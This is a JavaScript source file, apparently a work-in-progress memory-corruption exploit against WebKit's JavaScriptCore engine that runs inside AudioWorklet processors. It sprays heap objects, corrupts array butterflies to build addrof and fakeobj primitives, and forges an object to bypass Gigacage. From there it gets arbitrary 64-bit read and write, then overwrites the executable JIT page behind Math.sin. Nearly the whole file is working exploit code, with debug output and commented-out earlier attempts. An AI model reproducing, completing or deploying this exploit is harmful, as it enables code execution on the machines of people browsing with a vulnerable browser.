// constant added to double JSValues
      //const socket = io.connect('/');
/*registerProcessor("c", class {
        constructor() {
          // setup a message port to the main thread
          var port5 = new AudioWorkletProcessor().port;
          
        }
});*/
      function hex1(x) {
    if (x < 0)
        return `-${hex1(-x)}`;
    return `0x${x.toString(16)}`;
}
let data_view = new DataView(new ArrayBuffer(8));
var floatAsQword = float => { //f2i
    data_view.setFloat64(0, float, true);
    var low = data_view.getUint32(0, true);
    var high = data_view.getUint32(4, true);
    return low + (high * 0x100000000);
}
var qwordAsTagged = qword =>{
    return qwordAsFloat( qword- 0x02000000000000);
}
var qwordAsFloat = qword => { //i2f
    data_view.setUint32(0, qword%0x100000000, true);
    data_view.setUint32(4, qword/0x100000000, true);
    //data_view.setBigUint64(0, qword);
    return data_view.getFloat64(0, true);
}
      const kBoxedDoubleOffset = 0x0002000000000000n;

      var array_spray = [];
    for (var i = 0; i < 1000; ++i) {
        array_spray[i] = [13.37+i, 13.37];
    }
    var structure_spray = [];
for (var i = 0; i < 1000; ++i) {
    var ary = [13.37];
    ary.prop = 13.37;
    ary['p'+i] = 13.37;
    structure_spray.push(ary);
}
    var unboxed1 = [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37];
    unboxed1[0] = 4.2; // no CopyOnWrite
  //alert("hehe")
      function boxDouble(d) {
        return d + kBoxedDoubleOffset;
      }
      function unboxDouble(d) {
        return d - kBoxedDoubleOffset;
      }
      // the structure ID is wrong, but we'll fix it :)
      let doubleArrayCellHeader = 0x0108230700000000n;
      let f = new Float64Array(1);
      let u = new Uint32Array(f.buffer);
      function float2bigint(v) {
        f[0] = v;
        return BigInt(u[0]) | (BigInt(u[1]) << 32n);
      }
      function bigint2float(v) {
        u[0] = Number(v & 0xffffffffn);
        u[1] = Number(v >> 32n);
        return f[0];
      }
      // store things to prevent GC
      let keep = [];
      function gc(n=10000) {
        let tmp = [];
        for (var i = 0; i < n; i++) tmp.push(new Uint8Array(10000));
      }
      // message port to talk to main thread; will be set later
      let port = null;
      //let port1 = null;
      // will be implemented later
      let fakeobj = null;
      let addrof = null;
      for (var i = 0; i < 100; i++) keep.push([1.1*i]);
      let a0 = [0,0,0,0,0,0,0,0,0,0];

      let a1 = [0,0,0,0,0,0,0,0,0,0];
      // transition to unboxed double storage
      a1[3] = 13.37;
      let b0 = [0,0,0,0,0,0,0,0,0,0];
      let b1 = [{},{},13.37]//[0,0,a1,a1,0,0,0,0,0,0]; // store references to a1 to make b1 a boxed array
      // put zeroes in first two slots so JSCallbackData destruction is safe
      delete b1[0];
      delete b1[1];
      function setupPrimitives() {
        
        port.postMessage("setting up");
        if (a1.length != 0x1337) {
          port.postMessage("Failure on array length");
          return;
        }

        //const kSentinel = 1333.337;
        var kSentinel = qwordAsFloat(0x41414141414141)
        let offset = -1;
        b1[0] = kSentinel;
        // scan for the sentinel to find the offset from a to b
        for (var i = 0; i < 0x100; i++) {
          if (qwordAsTagged(floatAsQword(a1[i])) == kSentinel) {
            port.postMessage("a1[i]" + typeof a1 + hex1(floatAsQword(qwordAsTagged(floatAsQword(a1[i])))))
            offset = i;
            break;
          }
        }
        if (offset == -1) {
          port.postMessage("Failure finding offset");
          return;
        }
        //port.postMessage("here")
        // temporary implementations
        addrof = (val) => {
          b1[0] = val;
          return floatAsQword(a1[offset]);
        }
        fakeobj = (addr) => {
          a1[offset] = qwordAsFloat(addr);
          return b1[0];
        }
        var victim1 = structure_spray[510];
        // Gigacage bypass: Forge a JSObject which has its butterfly pointing
        // to victim
        var boxed1 = [{}];
        var print = (msg) => {
          port.postMessage(msg);
        }
        print("unboxed @ " + hex1(addrof(unboxed1)));
        print("boxed @ " + hex1(addrof(boxed1)));

    var outer = {
        header: qwordAsTagged(0x0108230900000000), // cell
        butterfly: victim1, // butterfly
    };
    print("outer @ " + hex1(addrof(outer)));

    var hax = fakeobj(addrof(outer) + 0x10);
    hax[1] = unboxed1;
    var shared_butterfly = floatAsQword(victim1[1]);
    print("shared butterfly @ " + hex1(shared_butterfly));
    hax[1] = boxed1;
    victim1[1] = qwordAsFloat(shared_butterfly);

    outer.header = qwordAsTagged(0x0108230700000000);

    var stage2 = {
        addrof: function(obj) {
            return addrof(obj)
        },

        fakeobj: function(addr) {
            return fakeobj(addr)
        },

        write64: function(where, what) {
            hax[1] = qwordAsFloat(where + 0x10);
            victim1.prop = this.fakeobj(qwordAsFloat(what));
        },

        read64: function(where) {
            //var reset = hax[1];
            hax[1] = qwordAsFloat(where + 0x10);
            var res = this.addrof(victim1.prop);
            //hax[1] = reset;
            //victim1.prop = shared_butterfly;
            return res;
        },
        write(addr, data) {
            while (data.length % 4 != 0)
                data.push(0);

            var bytes = new Uint8Array(data);
            var ints = new Uint16Array(bytes.buffer);

            for (var i = 0; i < ints.length; i++)
                this.write64(Add(addr, 2 * i), ints[i]);
        },
        read(addr, length) {
            var a = new Array(length);
            var i;

            for (i = 0; i + 8 < length; i += 8) {
                v = this.read64(addr + i).bytes()
                for (var j = 0; j < 8; j++) {
                    a[i+j] = v[j];
                }
            }

            v = this.read64(addr + i).bytes()
            for (var j = i; j < length; j++) {
                a[j] = v[j - i];
            }

            return a

        },

        test: function() {
            var addr = this.addrof({a: 0x1337});
            var x = this.fakeobj(addr);
            port.postMessage(hex1(x.a))
            if (hex1(x.a) != 0x1337) {
                print('stage2 addrof/fakeobj does not work');
            }

            var val = 0x42424242;
            //this.write64(0x4141414141,0x999999999)
            //this.read64(0x999999)
            this.write64(shared_butterfly - 8, 0x42424242);
            print(hex1(floatAsQword(unboxed1[1])))
            if (qwordAsFloat(val) != unboxed1[1]) {
                print('stage2 write does not work');
            }

            if (this.read64(shared_butterfly + 8) != 0x42424242) {
                print('stage2 read does not work');
            }
        },

        clear: function() {
            outer = null;
            hax = null;
            for (var i = 0; i < unboxed_size; ++i)
                boxed1[i] = null;
            boxed1 = null
            unboxed1 = null
        },
    };

    //stage2.test();
            var v = 0x4141;
            var obj = {p: v};
            var addr1 = stage2.addrof(v);
            var addr = stage2.addrof(obj);
            port.postMessage("addr deb " + hex1(addr))
            port.postMessage(hex1(stage2.fakeobj(addr).p));
            port.postMessage("lolzzz");
            //var socket = new WebSocket("")
            //const socket = new TextEncoder();
            var mathfunc = stage2.addrof(Math.sin)
            port.postMessage(hex1(mathfunc))
            var exe = stage2.read64(mathfunc+0x18)
            port.postMessage(hex1(exe))
            var jitcode = stage2.read64(exe+0x18)
            port.postMessage(hex1(jitcode));
            var rwx = stage2.read64(jitcode+0x20)
            port.postMessage(hex1(rwx))
            stage2.write64(rwx,0x41414141)
            //stage2.write64(mathfunc,0x4141414141)
            Math.sin()
            /*while(!(port1.onmessage())) {
                port.postMessage("not")
            }
            //port.onmessage = ;
            port.onmessage = (e) => {
                port.postMessage("gotit")
            }*/
            
            //var propertyAddr = addr;

            //var value = stage2.read(addr,8);
            //port.postMessage("value" + value)


        /*var addr1 = addrof({a:0x1337});
        var fb = fakeobj(addr1)

        port.postMessage("addrof {}" + hex1(fb.a))
        var obj = {
          jsCellHeader: qwordAsTagged(0x0108230700000000),
          fakeButterfly: a0
        };
        port.postMessage("here debug");
        let addr = addrof(obj);
        port.postMessage("Found obj @ " + hex1(addr));
        //port.postMessage("obj @ " + addr.toString(16));
        let fakeArr = fakeobj(addr + 0x10);
        // subtract off the incref
        doubleArrayCellHeader = floatAsQword(fakeArr[0]) - 0x1;
        port.postMessage("double array header @ " + hex1(doubleArrayCellHeader));
        //port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
        // fix broken cell header
        var doublebfly = floatAsQword(fakeArr[1])
        port.postMessage("double array butterfly @ " + hex1(doublebfly));
        fakeArr[0] = qwordAsFloat(doubleArrayCellHeader);
        port.postMessage("debug1")
        // grab a real butterfly pointer
        let doubleArrayButterfly = floatAsQword(fakeArr[1]);
        port.postMessage("debug2")
        // fix other broken cell header
        obj.fakeButterfly = b0;
        port.postMessage("debug3")
        fakeArr[0] = qwordAsFloat(doubleArrayCellHeader);
        port.postMessage("debug4")
        // fix the broken butterflys and setup cleaner addrof / fakeobj
        obj.jsCellHeader = qwordAsTagged(doubleArrayCellHeader);
        port.postMessage("debug4")
        //here
        obj.fakeButterfly = a1;
        port.postMessage("debug5")
        //port.postMessage(hex1(qwordAsTagged(doublebfly)))
        fakeArr[1] = qwordAsFloat(doublebfly);
        port.postMessage("debug6")
        obj.fakeButterfly = b1;
        port.postMessage("debug7")
        fakeArr[1] = qwordAsFloat(doublebfly);
        fakeobj = (addr) => {
          a1[offset] = qwordAsFloat(addr);
          return b1[0];
        }
        addrof = (val) => {
          b1[offset] = val;
          return floatAsQword(a1[0]);
        }*/
      }
      function pwn() {
        try {
          setupPrimitives();
          // ensure we can survive GC
          //gc();
          // TODO: rest of exploit goes here
          port.postMessage("done!");
        } catch(e) { // send exception strings to main thread (for debugging)
          port.postMessage("Exception!!");
          port.postMessage(e.toString());
        }
      }
      registerProcessor("a", class {
        constructor() {
          // setup a message port to the main thread
          port = new AudioWorkletProcessor().port;
          //port1 = new AudioWorkletProcessor().port;
          port.onmessage = pwn;

          // this part is magic
          // put 0xfffe000000001337 in the fastMalloc heap to fake the butterfly sizes
          eval('1 + 0x1336');
          // overwrite a1's butterfly with a fastMalloc pointer
          return {fill: 1, a: a0};
        }
      });
      registerProcessor("b", class {
        constructor() {
            /*port.onmessage = (e) => {
                port1.postMessage("recieved!!!")
            }*/
            //port1 = new AudioWorkletProcessor().port;
          // overwrite b1's butterfly with a fastMalloc pointer
          return {fill: 1, b: b0};
        }
      });
